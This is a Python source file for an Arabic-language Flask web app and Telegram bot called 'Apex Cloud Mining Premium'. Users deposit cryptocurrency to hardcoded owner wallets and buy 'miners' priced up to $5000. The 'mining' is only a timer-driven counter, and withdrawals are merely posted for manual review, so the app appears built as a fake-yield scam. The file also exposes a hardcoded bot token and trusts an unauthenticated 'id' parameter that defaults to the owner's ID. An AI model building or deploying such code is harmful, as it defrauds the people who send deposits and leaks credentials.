import os
import json
import time
import threading
from flask import Flask, render_template_string, request, jsonify
import telebot

app = Flask(__name__)

# --- 🔒 Threading Lock لمنع تداخل البيانات ---
data_lock = threading.Lock()

# --- ⚙️ الإعدادات الأساسية والنظام بالتوكن والرابط الفعليين ---
TOKEN = "8895527275:AAFiM1ZbdyaTDuMs_zSXOGV6Lkyhqk_HdoY"
OWNER_ID = 1609075265  

# 🌐 رابط موقعك الفعلي والنهائي على ريلواي
WEB_APP_URL = "https://Apexwarlords-production.up.railway.app" 

bot = telebot.TeleBot(TOKEN)

# 📁 مسار الحفظ الآمن للبيانات
DATA_DIR = '/app/data' if os.path.exists('/app/data') else '.'
DATA_FILE = os.path.join(DATA_DIR, 'data.json')

PAYMENT_CHANNEL_ID = "@Apex_payment1"     
WITHDRAWAL_CHANNEL_ID = "@lil_10l"       
NEWS_CHANNEL_LINK = "https://t.me/lS_3P"   

WALLETS = {
    "USDT_BEP20": "0x0aae3b8ed565178c5224296429310959536a80b6",
    "USDT_TRC20": "TFF2ehjWuWTA1k3rrJVbaz2tbUhAZDobni",
    "TON": "UQAO-l2K9qQtbHzLGiWyyGRtsaGBh0t82qHaa2GDMqq49Lp8"
}

MINER_TYPES = {
    "doge": {"name": "DOGE Miner", "cost": 0.5, "speed": 0.0120, "tier": "STARTER", "color": "#cbd5e1"},
    "wif": {"name": "WIF Turbine", "cost": 2.5, "speed": 0.0463, "tier": "COMMON", "color": "#22c55e"},
    "pengu": {"name": "PENGU COLD", "cost": 5.0, "speed": 0.2894, "tier": "COMMON", "color": "#22c55e"},
    "neiro": {"name": "NEIRO FOMO", "cost": 10.0, "speed": 1.3310, "tier": "RARE", "color": "#3b82f6"},
    "popcat": {"name": "POPCAT PUMP", "cost": 25.0, "speed": 3.6169, "tier": "RARE", "color": "#3b82f6"},
    "asteroid": {"name": "ASTEROID NODE", "cost": 50.0, "speed": 8.1019, "tier": "EPIC", "color": "#a855f7"},
    "shib": {"name": "SHIB CORE", "cost": 100.0, "speed": 18.5185, "tier": "EPIC", "color": "#a855f7"},
    "floki": {"name": "FLOKI RIG", "cost": 250.0, "speed": 57.7040, "tier": "EPIC", "color": "#a855f7"},
    "pepe": {"name": "PEPE Engine", "cost": 1000.0, "speed": 289.3519, "tier": "ELITE", "color": "#f97316"},
    "mtonga": {"name": "MTONGA Reactor", "cost": 5000.0, "speed": 777.0000, "tier": "LEGENDARY", "color": "#ef4444"}
}

TASKS = {
    "task1": {"title": "الانضمام لقناة الأخبار الرئيسية 📢", "reward": 0.10, "link": "https://t.me/lS_3P"},
    "task2": {"title": "الانضمام لقناة الإثباتات والسحب 🧾", "reward": 0.15, "link": "https://t.me/lil_10l"},
    "task3": {"title": "متابعة حساب التمويل الخاص بنا 💵", "reward": 0.20, "link": "https://t.me/Apex_payment1"}
}

def load_data():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f: json.dump({"users": {}}, f)
        return {"users": {}}
    with open(DATA_FILE, 'r') as f: 
        try: return json.load(f)
        except json.JSONDecodeError: return {"users": {}}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

def update_mining(user):
    now = time.time()
    last = user.get("last_calc", now)
    total_speed = 0.0100  
    if "miners" in user and isinstance(user["miners"], dict):
        for m_id, count in user["miners"].items():
            if m_id in MINER_TYPES:
                total_speed += MINER_TYPES[m_id]["speed"] * count
    elapsed = now - last
    user["mined"] = user.get("mined", 0.0) + (total_speed * (elapsed / 3600.0))
    user["last_calc"] = now
    return total_speed

# --- 🚀 واجهة الويب الشاملة فائقة التطور (Premium Cyberpunk UI) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apex Mining Premium</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: #030712; color: #f8fafc; margin: 0; padding-bottom: 120px; overflow-x: hidden; background-image: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #030712 70%); }
        .top-bar { display: flex; flex-direction: column; align-items: center; padding: 18px 15px; background: rgba(17, 24, 39, 0.7); border-bottom: 1px solid rgba(255, 255, 255, 0.08); backdrop-filter: blur(24px); position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 30px rgba(0,0,0,0.5); }
        .logo-area { font-size: 28px; font-weight: 900; background: linear-gradient(90deg, #38bdf8 0%, #818cf8 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 2px; text-shadow: 0 0 25px rgba(56, 189, 248, 0.4); margin-bottom: 15px; }
        .stats-row { display: flex; width: 100%; justify-content: space-between; gap: 14px; }
        .stat-box { flex: 1; background: linear-gradient(180deg, rgba(255,255,255,0.04) 0%, rgba(255,255,255,0.01) 100%); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 18px; padding: 14px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 16px; font-weight: 800; box-shadow: 0 8px 32px rgba(0,0,0,0.3); transition: 0.3s; }
        .stat-box.cash { color: #10b981; border-color: rgba(16, 185, 129, 0.3); text-shadow: 0 0 10px rgba(16,185,129,0.2); }
        .stat-box.gems { color: #38bdf8; border-color: rgba(56, 189, 248, 0.3); text-shadow: 0 0 10px rgba(56,189,248,0.2); }
        
        .page { display: none; padding: 20px 15px; animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .page.active { display: block; }
        
        .miner-card { background: linear-gradient(145deg, rgba(31, 41, 55, 0.7) 0%, rgba(17, 24, 39, 0.9) 100%); border-radius: 24px; border: 1px solid rgba(255,255,255,0.06); padding: 20px; margin-bottom: 16px; position: relative; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 12px 40px rgba(0,0,0,0.5); overflow: hidden; border-left: 5px solid var(--bar-color); }
        .miner-info { display: flex; flex-direction: column; gap: 4px; }
        .miner-name { font-size: 19px; font-weight: 800; color: #fff; }
        .miner-meta { font-size: 12px; color: #9ca3af; }
        .miner-owned { font-size: 13px; color: #10b981; font-weight: bold; background: rgba(16,185,129,0.1); padding: 2px 8px; border-radius: 20px; width: fit-content; margin-top: 4px; }
        .btn-buy { background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%); color: #030712; border: none; font-weight: 900; padding: 12px 22px; border-radius: 16px; cursor: pointer; box-shadow: 0 6px 20px rgba(245, 158, 10, 0.3); font-size: 14px; transition: 0.2s; }
        .btn-buy:active { transform: scale(0.95); }
        
        .main-container { display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .reactor-core { width: 220px; height: 220px; position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 30px; margin-top: 15px; }
        .reactor-sphere { width: 140px; height: 140px; background: radial-gradient(circle, #38bdf8 0%, #4f46e5 100%); border-radius: 50%; box-shadow: 0 0 60px rgba(56, 189, 248, 0.6); animation: pulse 2s infinite alternate; }
        .reactor-outer-ring { position: absolute; width: 190px; height: 190px; border: 2px dashed rgba(56, 189, 248, 0.4); border-radius: 50%; animation: rotateRing 10s linear infinite; }
        @keyframes pulse { from { transform: scale(1); box-shadow: 0 0 40px rgba(56, 189, 248, 0.5); } to { transform: scale(1.08); box-shadow: 0 0 70px rgba(56, 189, 248, 0.8); } }
        @keyframes rotateRing { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        .claim-panel { background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); width: 100%; padding: 25px; border-radius: 28px; text-align: center; box-shadow: 0 10px 35px rgba(29, 78, 216, 0.4); cursor: pointer; margin-bottom: 25px; transition: 0.2s; border: 1px solid rgba(255,255,255,0.1); }
        .claim-panel:active { transform: scale(0.98); }
        .grid-menu { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; width: 100%; }
        .grid-item { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06); padding: 18px; border-radius: 20px; text-align: center; cursor: pointer; font-weight: 700; transition: 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .grid-item:active { transform: scale(0.95); background: rgba(255,255,255,0.06); }
        
        .section-card { background: linear-gradient(180deg, rgba(31,41,55,0.5) 0%, rgba(17,24,39,0.5) 100%); border: 1px solid rgba(255,255,255,0.07); border-radius: 26px; padding: 22px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        input, select { width: 100%; padding: 16px; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.12); border-radius: 14px; color: white; margin-top: 8px; margin-bottom: 18px; text-align: right; font-weight: 600; font-size: 15px; transition: 0.3s; }
        input:focus, select:focus { border-color: #38bdf8; outline: none; box-shadow: 0 0 12px rgba(56,189,248,0.2); }
        label { font-size: 14px; font-weight: 700; color: #9ca3af; display: block; margin-right: 4px; }
        .btn-action { width: 100%; background: linear-gradient(90deg, #3b82f6 0%, #2563eb 100%); color: white; border: none; padding: 16px; border-radius: 14px; font-weight: 700; cursor: pointer; font-size: 16px; box-shadow: 0 6px 20px rgba(37,99,235,0.3); transition: 0.2s; }
        .btn-action:active { transform: scale(0.97); }
        
        .address-box { background: rgba(0, 0, 0, 0.5); border: 1px dashed rgba(56, 189, 248, 0.4); border-radius: 14px; padding: 14px; margin-bottom: 18px; text-align: center; animation: fadeIn 0.3s ease; }
        .btn-copy { background: rgba(56, 189, 248, 0.15); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3); padding: 6px 14px; border-radius: 10px; font-size: 12px; font-weight: bold; cursor: pointer; margin-top: 8px; transition: 0.2s; }
        .btn-copy:active { transform: scale(0.92); }

        .nav-bar { position: fixed; bottom: 20px; left: 4%; width: 92%; background: rgba(17, 24, 39, 0.9); border: 1px solid rgba(255, 255, 255, 0.08); display: flex; justify-content: space-around; padding: 14px 0; border-radius: 26px; backdrop-filter: blur(20px); z-index: 999; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #6b7280; cursor: pointer; font-size: 12px; font-weight: 700; gap: 5px; transition: 0.3s; }
        .nav-item.active { color: #38bdf8; text-shadow: 0 0 15px rgba(56,189,248,0.4); transform: translateY(-2px); }
        
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <div class="top-bar">
        <div class="logo-area">APEX MINING</div>
        <div class="stats-row">
            <div class="stat-box cash">💵 <span id="display-cash">{{user.balance}}</span> $</div>
            <div class="stat-box gems">⚡ <span>{{speed}} /س</span></div>
        </div>
    </div>

    <div id="page-main" class="page active">
        <div class="main-container">
            <div class="reactor-core">
                <div class="reactor-outer-ring"></div>
                <div class="reactor-sphere"></div>
            </div>
            <div class="claim-panel" onclick="claimMined()">
                <div style="font-size: 34px; font-weight: 900; color: #fff;"><span id="display-mined">0.000000</span></div>
                <div style="font-size: 14px; color: #93c5fd; margin-top: 6px; font-weight: 700; letter-spacing: 0.5px;">اضغط لتجميع الأرباح المتولدة 🚀</div>
            </div>
            <div class="grid-menu">
                {% if user_id == '1609075265' %}
                <div class="grid-item" onclick="dailyReward()" style="background: rgba(245,158,11,0.08); border-color: rgba(245,158,11,0.25); color: #fbbf24;">🎁 مكافأة المالك</div>
                {% endif %}
                <div class="grid-item" onclick="window.open('{{news_link}}')">📢 قناة الأخبار</div>
            </div>
        </div>
    </div>

    <div id="page-store" class="page">
        <h3 style="margin-top: 0; margin-bottom: 22px; text-align: center; color: #38bdf8; font-weight: 900; font-size: 22px;">متجر أجهزة التعدين السحابي</h3>
        {% for m_id, m in miner_types.items() %}
        <div class="miner-card" style="--bar-color: {{m.color}}">
            <div class="miner-info">
                <span class="miner-name">{{m.name}} <small style="font-size: 10px; color: {{m.color}}; font-weight: 900;">[{{m.tier}}]</small></span>
                <span class="miner-meta">السعر: {{m.cost}}$ | الإنتاج: +{{m.speed}}/س</span>
                <span class="miner-owned">العدد المملوك: {{user.miners.get(m_id, 0)}}</span>
            </div>
            <button class="btn-buy" onclick="buyMiner('{{m_id}}')">شراء</button>
        </div>
        {% endfor %}
    </div>

    <div id="page-tasks" class="page">
        <div class="section-card">
            <h4 style="margin-top: 0; color: #38bdf8; margin-bottom: 8px; font-size: 18px;">🔗 نظام كسب الإحالات</h4>
            <p style="font-size: 13px; color: #9ca3af; margin-bottom: 14px; line-height: 1.5;">شارك الرابط مع أصدقائك واحصل على مكافأة فورية بقيمة <strong style="color: #10b981;">0.05$</strong> عن كل شخص يسجل من خلالك!</p>
            <input type="text" id="ref-url" value="{{invite_url}}" readonly style="text-align: left; font-family: monospace; font-size: 12px; background: rgba(0,0,0,0.5);">
            <button class="btn-action" onclick="copyRefLink()">نسخ رابط الإحالة</button>
            <div style="display: flex; justify-content: space-between; font-size: 14px; margin-top: 14px; font-weight: bold; background: rgba(255,255,255,0.03); padding: 10px; border-radius: 12px;">
                <span>إجمالي الإحالات: 👤 {{user.get('ref_count', 0)}}</span>
                <span style="color: #10b981;">الأرباح: {{user.get('ref_earned', 0.0)}}$</span>
            </div>
        </div>

        <h4 style="color: #fff; margin-bottom: 12px; margin-right: 4px;">المهام الحالية المدعومة:</h4>
        {% for t_id, t in tasks_dict.items() %}
        <div class="miner-card" style="--bar-color: #4f46e5; padding: 16px 20px;">
            <div class="miner-info">
                <span style="font-weight: bold; font-size: 15px;">{{t.title}}</span>
                <span style="font-size: 12px; color: #10b981; font-weight: bold; margin-top: 2px;">المكافأة: +{{t.reward}}$</span>
            </div>
            {% if t_id in user.get('completed_tasks', []) %}
            <button class="btn-buy" disabled style="background: #374151; color: #9ca3af; box-shadow: none;">مكتملة ✓</button>
            {% else %}
            <button class="btn-buy" style="background: linear-gradient(135deg, #4f46e5 0%, #3b82f6 100%); color: #fff; box-shadow: 0 4px 12px rgba(79,70,229,0.3);" onclick="startTask('{{t_id}}', '{{t.link}}')">ابدأ</button>
            {% endif %}
        </div>
        {% endfor %}
    </div>

    <div id="page-wallet" class="page">
        <div class="section-card" style="border-color: rgba(16, 185, 129, 0.2);">
            <h4 style="margin-top: 0; color: #10b981; margin-bottom: 8px; font-size: 18px;">📥 شحن الرصيد (Deposit)</h4>
            <p style="font-size: 12px; color: #9ca3af; margin-bottom: 14px; line-height: 1.5;">قم باختيار الشبكة لإظهار عنوان المحفظة الخاص بها بدقة، ثم أرسل إثبات التحويل لتفعيل رصيدك.</p>
            
            <label>اختر شبكة الإيداع المتوفرة:</label>
            <select id="deposit-method" onchange="onDepositNetworkChange()">
                <option value="">-- اضغط للاختيار وإظهار العنوان --</option>
                <option value="USDT_BEP20">USDT (BEP-20)</option>
                <option value="USDT_TRC20">USDT (TRC-20)</option>
                <option value="TON">TON (Telegram Network)</option>
            </select>

            <div id="deposit-address-container" class="address-box" style="display: none;">
                <span style="font-size: 12px; color: #9ca3af; display: block; margin-bottom: 4px;">عنوان التحويل الخاص بك:</span>
                <strong id="deposit-address-text" style="word-break: break-all; color: #fff; font-size: 13px; font-family: monospace;"></strong>
                <br>
                <button class="btn-copy" onclick="copyDepositAddress()">نسخ العنوان 📋</button>
            </div>

            <label>المبلغ الذي قمت بتحويله ($):</label>
            <input type="number" id="deposit-amount" placeholder="أدخل القيمة المحولة بدقة">

            <label>اسم المستخدم أو هاش العملية (TxID):</label>
            <input type="text" id="deposit-txid" placeholder="ضع هنا ما يثبت إرسالك للأموال">
            
            <button class="btn-action" style="background: linear-gradient(90deg, #10b981 0%, #059669 100%); box-shadow: 0 6px 20px rgba(16,185,129,0.3);" onclick="submitDeposit()">تأكيد وإرسال إثبات الإيداع</button>
        </div>

        <div class="section-card" style="border-color: rgba(239, 68, 68, 0.2);">
            <h4 style="margin-top: 0; color: #ef4444; margin-bottom: 8px; font-size: 18px;">📤 طلب سحب فوري (Withdraw)</h4>
            <p style="font-size: 12px; color: #9ca3af; margin-bottom: 14px; line-height: 1.5;">اسحب أرباحك مباشرة إلى محفظتك الشخصية بكل أمان وسهولة فور بلوغ الحد الأدنى.</p>
            
            <label>اختر شبكة السحب:</label>
            <select id="withdraw-method">
                <option value="USDT_BEP20">USDT (BEP-20)</option>
                <option value="USDT_TRC20">USDT (TRC-20)</option>
                <option value="TON">TON (Telegram Network)</option>
            </select>
            
            <label>عنوان محفظة الاستلام الخاصة بك:</label>
            <input type="text" id="withdraw-address" placeholder="ضع عنوان محفظتك هنا بعناية">
            
            <label>المبلغ المراد سحبه ($):</label>
            <input type="number" id="withdraw-amount" placeholder="الحد الأدنى لتقديم السحب هو 5$">
            
            <button class="btn-action" style="background: linear-gradient(90deg, #ef4444 0%, #dc2626 100%); box-shadow: 0 6px 20px rgba(239,68,68,0.3);" onclick="submitWithdrawal()">تقديم طلب السحب الرسمي</button>
        </div>
    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="switchPage('main', this)">🏠 <span>الرئيسية</span></div>
        <div class="nav-item" onclick="switchPage('store', this)">⚡ <span>المتجر</span></div>
        <div class="nav-item" onclick="switchPage('tasks', this)">🎯 <span>المهام</span></div>
        <div class="nav-item" onclick="switchPage('wallet', this)">💼 <span>المالية</span></div>
    </div>

    <script>
        const WALLETS_MAP = {
            "USDT_BEP20": "0x0aae3b8ed565178c5224296429310959536a80b6",
            "USDT_TRC20": "TFF2ehjWuWTA1k3rrJVbaz2tbUhAZDobni",
            "TON": "UQAO-l2K9qQtbHzLGiWyyGRtsaGBh0t82qHaa2GDMqq49Lp8"
        };

        let minedAmount = {{user.mined}};
        let speedFactor = {{speed}} / 3600;

        setInterval(() => {
            minedAmount += speedFactor;
            document.getElementById('display-mined').innerText = minedAmount.toFixed(6);
        }, 1000);

        function switchPage(pageId, element) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('page-' + pageId).classList.add('active');
            element.classList.add('active');
        }

        function onDepositNetworkChange() {
            let select = document.getElementById('deposit-method');
            let container = document.getElementById('deposit-address-container');
            let addrText = document.getElementById('deposit-address-text');
            let val = select.value;
            
            if (val && WALLETS_MAP[val]) {
                addrText.innerText = WALLETS_MAP[val];
                container.style.display = 'block';
            } else {
                container.style.display = 'none';
            }
        }

        function copyDepositAddress() {
            let txt = document.getElementById('deposit-address-text').innerText;
            navigator.clipboard.writeText(txt);
            alert("تم نسخ عنوان المحفظة بنجاح! قم بالتحويل إليه الآن.");
        }

        function claimMined() {
            fetch('/api/claim?id={{user_id}}')
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.status === "success") location.reload();
            });
        }

        function buyMiner(minerId) {
            fetch('/api/buy_miner?id={{user_id}}&miner_id=' + minerId)
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.status === "success") location.reload();
            });
        }

        function startTask(taskId, url) {
            window.open(url, '_blank');
            setTimeout(() => {
                fetch('/api/complete_task?id={{user_id}}&task_id=' + taskId)
                .then(res => res.json())
                .then(data => {
                    alert(data.message);
                    if(data.status === "success") location.reload();
                });
            }, 4000);
        }

        function copyRefLink() {
            let inputEl = document.getElementById('ref-url');
            inputEl.select();
            inputEl.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(inputEl.value);
            alert("تم نسخ رابط إحالتك الفريد! انشره لتربح 💸");
        }

        function dailyReward() {
            fetch('/api/daily_reward?id={{user_id}}')
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.status === "success") location.reload();
            });
        }

        function submitDeposit() {
            let method = document.getElementById('deposit-method').value;
            let amount = document.getElementById('deposit-amount').value;
            let txid = document.getElementById('deposit-txid').value;
            if(!method || !amount || !txid) return alert("يرجى ملء جميع البيانات لإرسال طلب شحن الحساب!");
            
            fetch('/api/deposit?id={{user_id}}&method=' + method + '&amount=' + amount + '&txid=' + txid)
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.status === "success") location.reload();
            });
        }

        function submitWithdrawal() {
            let method = document.getElementById('withdraw-method').value;
            let address = document.getElementById('withdraw-address').value;
            let amount = document.getElementById('withdraw-amount').value;
            if(!address || !amount) return alert("يرجى ملء جميع الخانات المخصصة للسحب!");
            
            fetch('/api/withdraw?id={{user_id}}&method=' + method + '&address=' + address + '&amount=' + amount)
            .then(res => res.json())
            .then(data => {
                alert(data.message);
                if(data.status === "success") location.reload();
            });
        }
    </script>
</body>
</html>
"""

# --- 🛰️ مسارات الخادم والـ API المتكاملة الكبرى ---

@app.route('/')
def index():
    uid = request.args.get('id', '1609075265')
    invite_url = f"https://t.me/{bot.get_me().username}?start=ref_{uid}"
    with data_lock:
        data = load_data()
        if uid not in data['users']:
            data['users'][uid] = {"balance": 0.0, "gems": 0, "mined": 0.0, "last_calc": time.time(), "miners": {}, "last_reward": 0.0, "ref_count": 0, "ref_earned": 0.0, "completed_tasks": []}
        user = data['users'][uid]
        speed = update_mining(user)
        save_data(data)
    return render_template_string(HTML_TEMPLATE, user=user, user_id=uid, wallets=WALLETS, miner_types=MINER_TYPES, tasks_dict=TASKS, speed=round(speed, 4), invite_url=invite_url, news_link=NEWS_CHANNEL_LINK)

@app.route('/api/claim')
def api_claim():
    uid = request.args.get('id')
    with data_lock:
        data = load_data()
        user = data['users'].get(uid)
        if not user: return jsonify({"status": "error", "message": "فشل العثور على الحساب"})
        update_mining(user)
        mined = user.get("mined", 0.0)
        if mined < 0.01: return jsonify({"status": "error", "message": "الحد الأدنى للتجميع من المنجم للمحفظة هو 0.01$"})
        user["balance"] = round(user.get("balance", 0.0) + mined, 4)
        user["mined"] = 0.0
        save_data(data)
    return jsonify({"status": "success", "message": f"تم تجميع {round(mined, 4)}$ ونقلها بنجاح إلى رصيدك الأساسي!"})

@app.route('/api/buy_miner')
def api_buy_miner():
    uid = request.args.get('id')
    m_id = request.args.get('miner_id')
    if m_id not in MINER_TYPES: return jsonify({"status": "error", "message": "جهاز تعدين غير صالح"})
    
    cost = MINER_TYPES[m_id]["cost"]
    with data_lock:
        data = load_data()
        user = data['users'].get(uid)
        if user.get("balance", 0.0) < cost: return jsonify({"status": "error", "message": "رصيدك غير كافٍ لإتمام عملية الشراء! قم بطلب الشحن أولاً."})
        user["balance"] = round(user["balance"] - cost, 4)
        if "miners" not in user: user["miners"] = {}
        user["miners"][m_id] = user["miners"].get(m_id, 0) + 1
        update_mining(user)
        save_data(data)
    return jsonify({"status": "success", "message": f"تم شراء وتشغيل {MINER_TYPES[m_id]['name']} بنجاح داخل المنجم!"})

@app.route('/api/complete_task')
def api_complete_task():
    uid = request.args.get('id')
    t_id = request.args.get('task_id')
    if t_id not in TASKS: return jsonify({"status": "error", "message": "المهمة المحددة غير موجودة"})
    with data_lock:
        data = load_data()
        user = data['users'].get(uid)
        if "completed_tasks" not in user: user["completed_tasks"] = []
        if t_id in user["completed_tasks"]: return jsonify({"status": "error", "message": "لقد قمت بإتمام هذه المهمة بالفعل مسبقاً!"})
        user["completed_tasks"].append(t_id)
        user["balance"] = round(user.get("balance", 0.0) + TASKS[t_id]["reward"], 4)
        save_data(data)
    return jsonify({"status": "success", "message": f"تم التحقق بنجاح! أضيفت مكافأة بقيمة {TASKS[t_id]['reward']}$ لحسابك."})

@app.route('/api/daily_reward')
def api_daily_reward():
    uid = request.args.get('id')
    if int(uid) != OWNER_ID: return jsonify({"status": "error", "message": "صلاحية مرفوضة، ميزة خاصة بالمالك."})
    now = time.time()
    with data_lock:
        data = load_data()
        user = data['users'].get(uid)
        last_reward = user.get("last_reward", 0.0)
        if now - last_reward >= 86400:
            user["balance"] = round(user.get("balance", 0.0) + 5.0, 4)
            user["last_reward"] = now
            save_data(data)
            return jsonify({"status": "success", "message": "تم استلام مكافأة المالك الكبرى بنجاح (+5$)! 🚀"})
        return jsonify({"status": "error", "message": "لقد أخذت مكافأتك اليوم بالفعل! عد بعد مرور 24 ساعة."})

# 📥 مسار إرسال إثباتات الإيداع إلى قناة الدفع حصراً
@app.route('/api/deposit')
def api_deposit():
    uid = request.args.get('id')
    method = request.args.get('method')
    amount = request.args.get('amount')
    txid = request.args.get('txid')
    
    msg = (
        f"📥 **NEW DEPOSIT PROOF SUBMITTED**\n\n"
        f"👤 **User ID:** `{uid}`\n"
        f"💰 **Amount:** {amount}$\n"
        f"🛡️ **Network Chosen:** {method}\n"
        f"📌 **TXID / Proof Note:**\n`{txid}`\n\n"
        f"⚠️ *Please verify manually and add the funds to the user balance.*"
    )
    
    try:
        bot.send_message(PAYMENT_CHANNEL_ID, msg, parse_mode="Markdown")
        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
    except: pass
    
    return jsonify({"status": "success", "message": "تم إرسال إثبات الإيداع إلى إدارة قناة المدفوعات بنجاح للمراجعة الفورية!"})

# 📤 مسار تقديم طلبات السحب إلى قناة السحب حصراً
@app.route('/api/withdraw')
def api_withdraw():
    uid = request.args.get('id')
    method = request.args.get('method')
    addr = request.args.get('address')
    amount = float(request.args.get('amount', 0))
    
    if amount < 5.0: return jsonify({"status": "error", "message": "الحد الأدنى لتقديم طلب السحب من النظام هو 5$!"})
    
    with data_lock:
        data = load_data()
        user = data['users'].get(uid)
        if user.get("balance", 0.0) < amount: return jsonify({"status": "error", "message": "رصيدك الحالي غير كافٍ لسحب هذا المبلغ!"})
        user["balance"] = round(user["balance"] - amount, 4)
        save_data(data)
        
    msg = (
        f"📤 **NEW WITHDRAWAL REQUEST PENDING**\n\n"
        f"👤 **User ID:** `{uid}`\n"
        f"💰 **Requested Amount:** {amount}$\n"
        f"🛡️ **Network System:** {method}\n"
        f"📌 **Destination Wallet Address:**\n`{addr}`\n\n"
        f"⚡ *Status: Under Review by Administration*"
    )
    
    try:
        bot.send_message(WITHDRAWAL_CHANNEL_ID, msg, parse_mode="Markdown")
        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
    except: pass
    
    return jsonify({"status": "success", "message": "تم تقديم طلب السحب بنجاح وأُرسل لقناة السحوبات للمراجعة والتحويل السريع!"})

# --- 🤖 نظام أوامر ومعالجة رسائل تليجرام المتقدمة باللغة الإنجليزية الجذابة ---

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = str(message.from_user.id)
    text_split = message.text.split()
    
    with data_lock:
        data = load_data()
        is_new = uid not in data['users']
        
        if is_new:
            data['users'][uid] = {"balance": 0.0, "gems": 0, "mined": 0.0, "last_calc": time.time(), "miners": {}, "last_reward": 0.0, "ref_count": 0, "ref_earned": 0.0, "completed_tasks": []}
            
            if len(text_split) > 1 and text_split[1].startswith('ref_'):
                referrer_id = text_split[1].replace('ref_', '').strip()
                if referrer_id in data['users'] and referrer_id != uid:
                    ref_user = data['users'][referrer_id]
                    ref_user["ref_count"] = ref_user.get("ref_count", 0) + 1
                    ref_user["ref_earned"] = round(ref_user.get("ref_earned", 0.0) + 0.05, 4)
                    ref_user["balance"] = round(ref_user.get("balance", 0.0) + 0.05, 4)
                    try:
                        bot.send_message(
                            int(referrer_id), 
                            f"👤 **Elite Expansion!**\n\nA new user has just initialized via your terminal link. **+0.05$** has been successfully credited to your secure vault balance! 💸", 
                            parse_mode="Markdown"
                        )
                    except: pass
        save_data(data)
    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🚀 Launch Apex Mining Terminal", web_app=telebot.types.WebAppInfo(url=f"{WEB_APP_URL}/?id={uid}")))
    
    bot.reply_to(
        message, 
        f"🔥 **Welcome to Apex Cloud Mining Premium, Operator!**\n\nYou have successfully connected to the most advanced decentralized hash-rate generation network. "
        f"Start mining passive yields for free right now, recruit alliances to gain unmatched commissions, and activate high-tier reactors to maximize your income empire.\n\n"
        f"👇 **Tap the action button below to deploy your Mining Mini-App immediately:**", 
        reply_markup=markup
    )

@bot.message_handler(commands=['broadcast'])
def broadcast_to_all(message):
    if message.from_user.id != OWNER_ID: return
    text = message.text.replace('/broadcast', '').strip()
    if not text:
        bot.reply_to(message, "Please provide a valid text string to broadcast. Example:\n`/broadcast System Upgrade Successful`")
        return
    
    data = load_data()
    users = data.get("users", {})
    success, fail = 0, 0
    for u_id in users.keys():
        try:
            bot.send_message(int(u_id), f"📢 **SYSTEM WIDE BROADCAST:**\n\n{text}")
            success += 1
        except: fail += 1
    bot.reply_to(message, f"📢 **Broadcast Protocol Completed:**\n\n✅ Dispatched to: {success} active units\n❌ Blocked/Failed: {fail} units")

def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=15)
        except Exception:
            time.sleep(5)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

